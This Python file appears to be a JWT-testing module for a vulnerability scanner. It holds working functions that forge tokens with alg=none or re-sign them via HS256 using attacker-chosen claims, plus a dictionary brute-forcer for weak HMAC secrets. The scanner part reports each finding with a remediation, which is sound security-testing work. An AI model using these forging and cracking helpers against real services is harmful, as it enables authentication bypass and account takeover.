from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, ResultPacket, Vulnerability, TaskTarget
import time
import base64
import hashlib
import hmac
import json
# Hybrid AI Engine is imported lazily inside analyzer paths so helper imports stay cheap.

def _b64url_decode(value: str) -> bytes:
    value = value.strip()
    value += "=" * (-len(value) % 4)
    return base64.urlsafe_b64decode(value.encode())


def _b64url_encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).decode().rstrip("=")


def parse_jwt(token: str) -> dict:
    parts = (token or "").split(".")
    if len(parts) < 2:
        return {"valid": False, "error": "JWT must have at least header and payload"}
    try:
        header = json.loads(_b64url_decode(parts[0]).decode("utf-8", errors="replace"))
        payload = json.loads(_b64url_decode(parts[1]).decode("utf-8", errors="replace"))
        return {
            "valid": True,
            "header": header,
            "payload": payload,
            "signature": parts[2] if len(parts) > 2 else "",
            "alg": header.get("alg", ""),
        }
    except Exception as exc:
        return {"valid": False, "error": str(exc)}


def forge_alg_none(token: str, claim_overrides: dict | None = None) -> str:
    parsed = parse_jwt(token)
    if not parsed.get("valid"):
        raise ValueError(parsed.get("error", "Invalid JWT"))
    header = dict(parsed["header"])
    payload = dict(parsed["payload"])
    header["alg"] = "none"
    payload.update(claim_overrides or {})
    return f"{_b64url_encode(json.dumps(header, separators=(',', ':')).encode())}.{_b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}."


def forge_hs256(token: str, secret: str, claim_overrides: dict | None = None) -> str:
    parsed = parse_jwt(token)
    if not parsed.get("valid"):
        raise ValueError(parsed.get("error", "Invalid JWT"))
    header = dict(parsed["header"])
    payload = dict(parsed["payload"])
    header["alg"] = "HS256"
    payload.update(claim_overrides or {})
    signing_input = ".".join([
        _b64url_encode(json.dumps(header, separators=(",", ":")).encode()),
        _b64url_encode(json.dumps(payload, separators=(",", ":")).encode()),
    ])
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{_b64url_encode(sig)}"


def crack_hs256_secret(token: str, candidates: list[str]) -> str | None:
    parts = (token or "").split(".")
    if len(parts) != 3:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected = parts[2]
    for secret in candidates:
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(_b64url_encode(sig), expected):
            return secret
    return None

class JWTTokenCracker(BaseArsenalModule):
    def __init__(self):
        super().__init__()
        self.name = "JWT Token Cracker"

    async def generate_payloads(self, packet: JobPacket) -> list[TaskTarget]:
        return [packet.target]

    async def analyze_responses(self, interactions: list[tuple[TaskTarget, str]], packet: JobPacket) -> list[Vulnerability]:
        vulnerabilities = []
        
        for target, text in interactions:
            if "token=" in target.url:
                vulnerabilities.append(Vulnerability(
                     name="Weak JWT Implementation",
                     severity="HIGH",
                     description="JWT found in URL parameters.",
                     evidence=f"Token exposed in URL: {target.url}",
                     remediation="Place JWTs in Authorization header or HttpOnly cookies."
                ))
            
            token = ""
            if "token=" in target.url:
                token = target.url.split("token=")[-1].split("&")[0]

            parsed = parse_jwt(token)
            if parsed.get("valid"):
                alg = str(parsed.get("alg", "")).lower()
                if alg == "none":
                    vulnerabilities.append(Vulnerability(
                        name="JWT alg=none Accepted",
                        severity="CRITICAL",
                        description="The token advertises alg=none, which must never be accepted for authenticated sessions.",
                        evidence=f"JWT header: {parsed.get('header')}",
                        remediation="Reject unsigned JWTs and pin accepted algorithms server-side."
                    ))
                weak_secret = crack_hs256_secret(token, ["secret", "password", "admin", "jwt", "changeme", "123456"])
                if weak_secret:
                    vulnerabilities.append(Vulnerability(
                        name="Weak JWT HS256 Secret",
                        severity="HIGH",
                        description="JWT signature validated with a common weak HMAC secret.",
                        evidence=f"Recovered weak secret candidate: {weak_secret}",
                        remediation="Rotate JWT signing keys and use high-entropy secrets or asymmetric signing."
                    ))
                
            from backend.ai.cortex import get_cortex_engine

            cortex = get_cortex_engine()
            jwt_analysis = await cortex.analyze_jwt_weakness(token=token, url=target.url)
            
            if jwt_analysis and jwt_analysis.get("weaknesses"):
                for weakness in jwt_analysis["weaknesses"]:
                    vulnerabilities.append(Vulnerability(
                        name=f"JWT Weakness: {weakness.replace('_', ' ').title()}",
                        severity="HIGH" if jwt_analysis.get("risk_score", 0) > 60 else "MEDIUM",
                        description=f"AI detected JWT weakness: {weakness}. Risk: {jwt_analysis.get('risk_score', 0)}",
                        evidence=f"Weaknesses: {jwt_analysis['weaknesses']}",
                        remediation=jwt_analysis.get("recommendations", ["Implement RS256 JWT validation."])[0] if jwt_analysis.get("recommendations") else "Implement RS256 JWT validation."
                    ))

        return vulnerabilities
